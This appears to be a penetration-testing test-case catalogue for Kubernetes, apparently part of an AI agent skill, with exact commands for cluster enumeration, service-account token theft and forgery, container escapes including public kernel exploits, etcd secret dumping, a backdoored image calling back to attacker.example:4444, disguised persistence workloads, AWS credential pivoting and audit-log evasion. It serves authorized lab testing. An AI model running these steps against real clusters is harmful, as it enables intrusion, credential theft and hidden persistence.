# Kubernetes Attack Test Cases

> Companion to `SKILL.md`, containing structured test cases organized by category with severity ratings.
> All commands assume an authorized engagement scope, a lab cluster (kubernetes-goat, kind, minikube), or a clone of the production cluster. Never run active exploitation against production without explicit written authorization.

---

## Statistics

| Category | Count | Severity Range |
|------|------|-----------|
| A. Cluster Reconnaissance & Discovery | 2 | LOW - MEDIUM |
| B. RBAC Privilege Escalation | 2 | HIGH - CRITICAL |
| C. Pod & Runtime Escape | 2 | HIGH - CRITICAL |
| D. Control Plane Exploitation | 2 | CRITICAL |
| E. Supply Chain & Persistence | 2 | HIGH - CRITICAL |
| F. Cloud IAM Pivot & Detection Evasion | 2 | HIGH - CRITICAL |
| **Total** | **12** | **LOW - CRITICAL** |

---

## A. Cluster Reconnaissance & Discovery

### TC-KA-001: Anonymous API Server Access Enumeration

| Field | Value |
|------|-----|
| **ID** | TC-KA-001 |
| **Name** | Anonymous API Server Access Enumeration |
| **Severity** | MEDIUM |
| **Category** | Cluster Reconnaissance |
| **Objective** | Determine whether the API server permits anonymous authentication and, if so, enumerate the access granted to `system:anonymous` / `system:unauthenticated`. |
| **Prerequisites** | Network reachability to the API server (6443/tcp); no credentials. Optionally: `kubectl`, `curl`, `kube-hunter` installed. |
| **Tools** | curl, kubectl, kube-hunter |
| **Steps** | 1. `curl -sk https://<api-server>/version` — note whether the response is 200 (anonymous read OK) or 401 (auth required).<br>2. `curl -sk https://<api-server>/api/v1/namespaces` — 401 vs 200 vs 403 determines whether anonymous can list namespaces.<br>3. `kubectl auth can-i --list --as=system:anonymous` and `--as=system:unauthenticated` against a kubeconfig pointed at the cluster (even without valid creds).<br>4. `kube-hunter --remote <api-server-ip> --active` — note any "Anonymous authentication" or "CVE-2018-1002105" findings.<br>5. Cross-reference detected k8s version against `kubectl version` output and the k8s CVE feed. |
| **Expected Result** | Either (a) anonymous is disabled (401 on all unauthenticated requests) — finding is informational, or (b) anonymous is enabled with limited RBAC — finding is MEDIUM, or (c) anonymous has wildcard RBAC (`*` on `*`) — finding is CRITICAL. |
| **False Positive Risk** | LOW — `kubectl auth can-i` is authoritative. |
| **Cleanup** | None (read-only enumeration). |
| **References** | payloads.md §2.2, §7.1; CVE-2018-1002105 |

### TC-KA-002: Self-Subject RBAC Enumeration

| Field | Value |
|------|-----|
| **ID** | TC-KA-002 |
| **Name** | Self-Subject RBAC Enumeration (in-pod) |
| **Severity** | LOW |
| **Category** | Cluster Reconnaissance |
| **Objective** | From inside a compromised pod, enumerate the RBAC permissions of the mounted ServiceAccount to identify escalation paths. |
| **Prerequisites** | RCE or shell inside a pod in the target cluster; the pod has a mounted SA token (default behavior). |
| **Tools** | kubectl (if installed) or curl + jq, the mounted SA token |
| **Steps** | 1. Read the SA token: `cat /var/run/secrets/kubernetes.io/serviceaccount/token`.<br>2. Read the namespace: `cat /var/run/secrets/kubernetes.io/serviceaccount/namespace`.<br>3. Run `kubectl auth can-i --list` if kubectl is available, else call the self-subject rules review API directly:<br>`curl -sk --cacert $CACERT -H "Authorization: Bearer $TOKEN" $APISERVER/apis/authorization.k8s.io/v1/selfsubjectrulesreviews -H 'Content-Type: application/json' -d '{"kind":"SelfSubjectRulesReview","apiVersion":"authorization.k8s.io/v1","spec":{"namespace":"'$NS'"}}' | jq '.status.resourceRuleInfos[] | {verbs, resources}'`.<br>4. Decode the token JWT to extract the SA name: `echo $TOKEN \| cut -d. -f2 \| base64 -d 2>/dev/null \| jq .`.<br>5. Identify "verbs of interest": `create` on `pods`, `get` on `secrets`, `create` on `serviceaccounts/token`, `create` on `certificatesigningrequests`, `create` on `clusterrolebindings`, `*` on anything. |
| **Expected Result** | A list of (verb, resource) tuples for the SA. Each "verb of interest" is a documented escalation path documented in payloads.md §3.2-3.3. |
| **False Positive Risk** | LOW — `selfsubjectrulesreviews` is authoritative. |
| **Cleanup** | None (read-only). |
| **References** | payloads.md §2.1, §3.1; kubectl auth can-i docs |

---

## B. RBAC Privilege Escalation

### TC-KA-003: Pod Create + hostPath Escape Chain

| Field | Value |
|------|-----|
| **ID** | TC-KA-003 |
| **Name** | Pod Create + hostPath Escape Chain |
| **Severity** | CRITICAL |
| **Category** | RBAC Privilege Escalation |
| **Objective** | Demonstrate that a ServiceAccount with `create` on `pods` can escape to a node by creating a privileged pod that mounts the host's root filesystem. |
| **Prerequisites** | A SA with `create` on `pods` in any namespace; PSA mode is `warn` (not `enforce`) or absent for that namespace. |
| **Tools** | kubectl |
| **Steps** | 1. Confirm permission: `kubectl auth can-i create pods` (expect yes).<br>2. Apply the escape pod manifest from payloads.md §3.2 (`pwn.yaml`) — privileged + hostPath `/` + hostPID + hostNetwork.<br>3. `kubectl logs pwn -f` — observe the `chroot /host sh` shell.<br>4. From the shell: `id`, `cat /etc/shadow`, `ls /var/lib/kubelet` to confirm host root access.<br>5. Read `/etc/kubernetes/admin.conf` if on a control plane node. |
| **Expected Result** | Pod created; logs show successful `chroot` into the host root filesystem; attacker has root on the node. |
| **False Positive Risk** | LOW — the escape is reproducible. |
| **Cleanup** | `kubectl delete pod pwn`. If admin.conf was exfiltrated, rotate the cluster CA and admin cert. |
| **References** | payloads.md §3.2, §5.2; CVE class: privileged pod escape |

### TC-KA-004: Service Account Token Forgery (1.24+)

| Field | Value |
|------|-----|
| **ID** | TC-KA-004 |
| **Name** | Service Account Token Forgery via `serviceaccounts/token` |
| **Severity** | HIGH |
| **Category** | RBAC Privilege Escalation |
| **Objective** | Demonstrate that a SA with `create` on `serviceaccounts/token` can forge tokens for any other ServiceAccount, enabling lateral movement and privilege escalation. |
| **Prerequisites** | A SA whose RBAC permits `create` on the `serviceaccounts/token` subresource. |
| **Tools** | kubectl |
| **Steps** | 1. Confirm permission: `kubectl auth can-i create serviceaccounts/token` (expect yes).<br>2. Enumerate other SAs: `kubectl get sa -A`.<br>3. Forge a token for a privileged SA: `kubectl create token -n kube-system deployment-controller`.<br>4. Use the forged token to call the API: `KUBE_TOKEN=<forged> kubectl --token $KUBE_TOKEN --as system:serviceaccounts:kube-system:deployment-controller auth can-i --list`.<br>5. If `kube-system/default` has cluster-admin (common misconfiguration), forge a token for it and escalate. |
| **Expected Result** | A valid JWT for the target SA; the token grants the SA's full RBAC when replayed. |
| **False Positive Risk** | LOW — `kubectl create token` is the documented API. |
| **Cleanup** | Forged tokens are short-lived (default 1h) and bound to the SA; explicit cleanup is rarely required. Document the demonstration in the report. |
| **References** | payloads.md §3.3, §4.2; TokenRequest API docs |

---

## C. Pod & Runtime Escape

### TC-KA-005: hostPath + Privileged Escape Verification

| Field | Value |
|------|-----|
| **ID** | TC-KA-005 |
| **Name** | hostPath + Privileged Escape Verification |
| **Severity** | CRITICAL |
| **Category** | Pod Escape |
| **Objective** | Verify that a pod with `hostPath: /` mount + `privileged: true` can be escaped to obtain root on the node. |
| **Prerequisites** | A pod with the above securityContext (intentionally vulnerable, e.g., kubernetes-goat scenario). |
| **Tools** | kubectl, chroot / nsenter |
| **Steps** | 1. `kubectl exec -it <target-pod> -- sh`.<br>2. Inside the pod, verify the host mount: `ls /host` (or wherever hostPath is mounted).<br>3. `chroot /host sh`.<br>4. Confirm host root: `id` (uid 0), `hostname` (node hostname), `cat /etc/os-release`.<br>5. Demonstrate impact: `crontab -l` (read root's cron), `cat /var/lib/kubelet/pki/kubelet-client-current.pem` (kubelet cert). |
| **Expected Result** | Successful `chroot` to host root filesystem; attacker has node root. |
| **False Positive Risk** | LOW. |
| **Cleanup** | Exit the chroot, `kubectl delete pod <target-pod>` if created by the engagement. |
| **References** | payloads.md §5.2-5.4; CDK `evaluate --full` |

### TC-KA-006: Kernel CVE Container Escape (CVE-2022-0185 or CVE-2024-1086)

| Field | Value |
|------|-----|
| **ID** | TC-KA-006 |
| **Name** | Kernel CVE Container Escape |
| **Severity** | CRITICAL |
| **Category** | Runtime Escape |
| **Objective** | Exploit a known kernel CVE (CVE-2022-0185 heap overflow in `fs/context`, or CVE-2024-1086 netfilter UAF) to escape a container with CAP_SYS_ADMIN or unprivileged user namespaces. |
| **Prerequisites** | Pod has CAP_SYS_ADMIN or unprivileged user namespaces are enabled; kernel version is in the affected range (CVE-2022-0185: < 5.16.11, < 5.15.25, < 5.10.102; CVE-2024-1086: < 6.1.76, < 6.6.15, < 6.7.3, < 6.8-rc1). |
| **Tools** | gcc/make, public PoC (Crusaders-of-Rust/CVE-2022-0185 or Notselwyn/CVE-2024-1086) |
| **Steps** | 1. Inside the pod: `uname -r` to confirm affected kernel.<br>2. `git clone https://github.com/Crusaders-of-Rust/CVE-2022-0185` (or CVE-2024-1086 PoC).<br>3. `make`.<br>4. `./exploit`.<br>5. Verify escape: `id` (root), `lsns` (host namespaces visible), `cat /proc/1/comm` (host's init). |
| **Expected Result** | Exploit completes; shell is now root on the host. |
| **False Positive Risk** | LOW — the PoC is reproducible on the affected kernel. |
| **Cleanup** | Reboot the node after testing (kernel state may be corrupted). Document in report and recommend immediate kernel patch. |
| **References** | payloads.md §6.1-6.3; CVE-2022-0185, CVE-2024-1086 advisories |

---

## D. Control Plane Exploitation

### TC-KA-007: Kubelet Anonymous Endpoint Exploitation

| Field | Value |
|------|-----|
| **ID** | TC-KA-007 |
| **Name** | Kubelet Anonymous Endpoint (10250) Exploitation |
| **Severity** | CRITICAL |
| **Category** | Control Plane Exploitation |
| **Objective** | Exploit a kubelet with `--anonymous-auth=true` (or no anonymous auth restriction) to execute commands in pods across the cluster without valid credentials. |
| **Prerequisites** | Network reachability to a node's kubelet port (10250/tcp); kubelet `--anonymous-auth=true` and the `system:anonymous` / `system:unauthenticated` group has `pods/exec` (or the kubelet is configured with no auth). |
| **Tools** | curl, kubeletctl, CDK |
| **Steps** | 1. `curl -sk https://<node-ip>:10250/pods` — confirm pods list returns (anonymous accepted).<br>2. `kubeletctl pods -s <node-ip>` — structured pod list.<br>3. `kubeletctl exec -s <node-ip> -p <pod-name> -c <container-name> "id"` — execute a command.<br>4. `cdk kcurl evade https://<node-ip>:10250/pods` — CDK alternative.<br>5. Pivot: enumerate SAs on the node, steal mounted tokens from each pod's filesystem via the kubelet exec. |
| **Expected Result** | Arbitrary command execution in any pod on the targeted node, without API server credentials. |
| **False Positive Risk** | LOW — `kubeletctl exec` is authoritative. |
| **Cleanup** | None (read/exec only). Recommend defender disable `--anonymous-auth=true` on the kubelet. |
| **References** | payloads.md §2.2, §5.5; kube-hunter "Kubelet Anonymous Access" |

### TC-KA-008: etcd Direct Access Secret Dump

| Field | Value |
|------|-----|
| **ID** | TC-KA-008 |
| **Name** | etcd Direct Access Secret Dump |
| **Severity** | CRITICAL |
| **Category** | Control Plane Exploitation |
| **Objective** | Demonstrate that direct access to etcd (via client certs or unauthenticated port) allows reading every Secret in the cluster and forging arbitrary RBAC bindings. |
| **Prerequisites** | Network reachability to an etcd endpoint (2379/tcp); either unauthenticated etcd (rare, seen in misconfigured k3s/microk8s) or stolen client certs (`/etc/kubernetes/pki/etcd/`). |
| **Tools** | etcdctl (ETCDCTL_API=3) |
| **Steps** | 1. `ETCDCTL_API=3 etcdctl --endpoints=https://<etcd>:2379 --cacert=ca.crt --cert=server.crt --key=server.key endpoint health` — confirm access.<br>2. `etcdctl ... get / --prefix --keys-only \| head` — list keyspace.<br>3. `etcdctl ... get /registry/secrets --prefix` — dump every Secret (base64-encoded).<br>4. `etcdctl ... get /registry/configmaps --prefix` — dump ConfigMaps.<br>5. Forge a `cluster-admin` ClusterRoleBinding: write `/registry/clusterrolebindings/pwn-admin` per payloads.md §8.3.<br>6. Verify via the API server: `kubectl get clusterrolebinding pwn-admin`. |
| **Expected Result** | Complete dump of cluster Secrets; forged RBAC binding visible to the API server. |
| **False Positive Risk** | LOW. |
| **Cleanup** | `etcdctl ... del /registry/clusterrolebindings/pwn-admin` to remove the forged binding. Rotate every Secret that was exposed. Rotate the etcd client certs. |
| **References** | payloads.md §8.1-8.4; NSA Kubernetes Hardening Guide §3.2 |

---

## E. Supply Chain & Persistence

### TC-KA-009: Poisoned Image Supply Chain Attack

| Field | Value |
|------|-----|
| **ID** | TC-KA-009 |
| **Name** | Poisoned Image Supply Chain Attack |
| **Severity** | HIGH |
| **Category** | Supply Chain |
| **Objective** | Build a backdoored image, push it to a registry the cluster pulls from, and demonstrate persistent access via the backdoor on every pod restart. |
| **Prerequisites** | Write access to an image registry the cluster pulls from (compromised creds, weak registry policy, or a registry the engagement owns). |
| **Tools** | docker (or buildah/podman), trivy, cosign, dive |
| **Steps** | 1. Build the backdoored image per payloads.md §10.2.<br>2. `docker push myregistry/nginx:1.25`.<br>3. Trigger a pod restart in the cluster that pulls `nginx:1.25` from `myregistry`.<br>4. Confirm the reverse shell callback arrives at `attacker.example:4444`.<br>5. (Defender side) `trivy image myregistry/nginx:1.25` and `dive myregistry/nginx:1.25` — verify what each tool detects. |
| **Expected Result** | Pod restart pulls the backdoored image; reverse shell fires; trivy/dive may or may not detect the backdoor depending on signature coverage. |
| **False Positive Risk** | LOW. |
| **Cleanup** | Delete the poisoned tag from the registry. Re-pull the legitimate image. Document the detection gap. |
| **References** | payloads.md §10.2-10.5; cosign + Kyverno defense pattern |

### TC-KA-010: Persistence via DaemonSet + CronJob

| Field | Value |
|------|-----|
| **ID** | TC-KA-010 |
| **Name** | Persistence via DaemonSet + CronJob |
| **Severity** | CRITICAL |
| **Category** | Persistence |
| **Objective** | Establish long-lived access to a cluster via a privileged DaemonSet and a beaconing CronJob that blends in with normal cluster operations. |
| **Prerequisites** | `cluster-admin` or equivalent RBAC (or `create` on DaemonSets and CronJobs in `kube-system`). |
| **Tools** | kubectl |
| **Steps** | 1. Apply the DaemonSet manifest from payloads.md §13.1 — every node gets a privileged pod.<br>2. Apply the CronJob manifest from payloads.md §13.2 — `metrics-collector` in `kube-system` calls back every 15 minutes.<br>3. Verify the DaemonSet: `kubectl get ds -n kube-system` (one pod per node).<br>4. Verify the CronJob: `kubectl get cronjob -n kube-system` and check logs after 15 minutes.<br>5. Simulate scale-up: add a node → confirm the DaemonSet schedules on it automatically. |
| **Expected Result** | DaemonSet runs on every node (including new ones); CronJob beacons on schedule. |
| **False Positive Risk** | LOW. |
| **Cleanup** | `kubectl delete ds kube-cache -n kube-system`; `kubectl delete cronjob metrics-collector -n kube-system`. Audit for similar persistence post-engagement. |
| **References** | payloads.md §13.1-13.2; MITRE ATT&CK for Containers T1611 "Deploy Container" |

---

## F. Cloud IAM Pivot & Detection Evasion

### TC-KA-011: EKS IRSA Pivot to AWS

| Field | Value |
|------|-----|
| **ID** | TC-KA-011 |
| **Name** | EKS IRSA Pivot to AWS Account |
| **Severity** | CRITICAL |
| **Category** | Cloud IAM Pivot |
| **Objective** | From a compromised pod in an EKS cluster, exfiltrate the IRSA web-identity token, exchange it for AWS STS credentials, and operate in the AWS account as the bound role. |
| **Prerequisites** | RCE or shell inside a pod with IRSA configured (the pod's SA has an `eks.amazonaws.com/role-arn` annotation). |
| **Tools** | awscli |
| **Steps** | 1. Inside the pod: `env \| grep AWS` — capture `AWS_ROLE_ARN` and `AWS_WEB_IDENTITY_TOKEN_FILE`.<br>2. Read the token: `cat $AWS_WEB_IDENTITY_TOKEN_FILE`.<br>3. Exchange for STS creds: `aws sts assume-role-with-web-identity --role-arn $AWS_ROLE_ARN --role-session-name pwn --web-identity-token "$(cat $AWS_WEB_IDENTITY_TOKEN_FILE)"`.<br>4. Export the returned credentials as env vars.<br>5. Verify: `aws sts get-caller-identity`.<br>6. Enumerate: `aws s3 ls`, `aws iam list-attached-role-policies --role-name <role>`, `aws eks list-clusters`. |
| **Expected Result** | Valid AWS credentials for the bound role; caller identity confirms the IAM role. Further enumeration reveals the cloud account's permissions. |
| **False Positive Risk** | LOW — `sts assume-role-with-web-identity` is the documented AWS API. |
| **Cleanup** | Revoke active STS sessions for the role (AWS console or `aws iam delete-role-policy` is overkill — better: shorten role max session duration, or rotate the role's trust policy). Document in report. |
| **References** | payloads.md §12.1; AWS IRSA docs |

### TC-KA-012: Audit Log Evasion via Existing Token Reuse

| Field | Value |
|------|-----|
| **ID** | TC-KA-012 |
| **Name** | Audit Log Evasion via Existing Token Reuse |
| **Severity** | HIGH |
| **Category** | Detection Evasion |
| **Objective** | Demonstrate that an attacker can operate inside a cluster with audit logging enabled by reusing an existing ServiceAccount token externally (avoiding in-cluster API calls that audit-log the source pod). |
| **Prerequisites** | A SA token exfiltrated from a pod; audit logging at Metadata level on the API server. |
| **Tools** | curl, the exfiltrated token |
| **Steps** | 1. Exfiltrate the SA token from a pod (TC-KA-002).<br>2. From an external host (not the pod), replay the token: `curl -sk --cacert ca.crt -H "Authorization: Bearer $TOKEN" https://<api-server>/api/v1/namespaces`.<br>3. In the audit log, the source IP will be the external host, not the pod — defeating IP-based attribution.<br>4. Avoid `pods/exec`, `secrets get` (these are specifically audited) — instead use `auth can-i` enumeration and SA token forgery.<br>5. Verify evasion: `kubectl logs -n kube-system <api-server-pod> -c kube-apiserver \| grep $TOKEN_FINGERPRINT` — confirm the source IP is the external host. |
| **Expected Result** | Successful API operations from the external host; audit log shows the external host as source, not the compromised pod. |
| **False Positive Risk** | MEDIUM — sophisticated defenders correlate token identity with pod identity; the evasion is partial. |
| **Cleanup** | Rotate the exfiltrated SA token: `kubectl delete secret <sa>-token-<hash>` (legacy) or shorten projected token TTL (1.24+). |
| **References** | payloads.md §14.1, §14.5; K8s audit policy docs |

---

## Test Case Cross-Reference Matrix

| Test Case | MITRE ATT&CK for Containers Technique | Primary Tool |
|-----------|----------------------------------------|--------------|
| TC-KA-001 | T1613 Container and Resource Discovery | kube-hunter |
| TC-KA-002 | T1613 + T1611 | kubectl auth can-i |
| TC-KA-003 | T1611 Escape to Host | kubectl |
| TC-KA-004 | T1552 Unsecured Credentials | kubectl create token |
| TC-KA-005 | T1611 Privileged Container | chroot / nsenter |
| TC-KA-006 | T1611 Kernel Exploit | CVE PoC |
| TC-KA-007 | T1610 + T1615 | kubeletctl |
| TC-KA-008 | T1602 Data from Config Repository | etcdctl |
| TC-KA-009 | T1610 Deploy Container (malicious) | docker |
| TC-KA-010 | T1611 Deploy Container (persistence) | kubectl |
| TC-KA-011 | T1552 + Cloud IAM | aws sts |
| TC-KA-012 | T1614 Clear History (audit evasion) | curl |

---

## Running the Full Test Suite

```bash
# Spin up kubernetes-goat as the target lab
git clone https://github.com/madhuakula/kubernetes-goat
cd kubernetes-goat
kubectl apply -f setup/single-cluster-scenario-1-5.yaml
bash setup/scenarios/set-current-context.sh

# Run TC-KA-001 through TC-KA-012 against the lab
# (each test case documents its own setup and cleanup)

# Alternatively, kind (Kubernetes IN Docker) for a clean ephemeral cluster:
kind create cluster --name ka-lab --image kindest/node:v1.30.0
kubectl get nodes

# Tear down when done
kind delete cluster --name ka-lab
```

---

## Reporting Findings

Each test case that produces a finding should be documented in the engagement report with:

1. **Test case ID** (TC-KA-XXX)
2. **Severity** (LOW / MEDIUM / HIGH / CRITICAL)
3. **Description** — what the misconfiguration or vulnerability is
4. **Reproduction** — exact commands (reference payloads.md section)
5. **Impact** — what an adversary could do
6. **Evidence** — captured output, audit log excerpts
7. **Recommendation** — specific remediation (PSA enforce, RBAC tightening, network policy, etc.)
8. **References** — payloads.md sections, CVE IDs, MITRE ATT&CK techniques
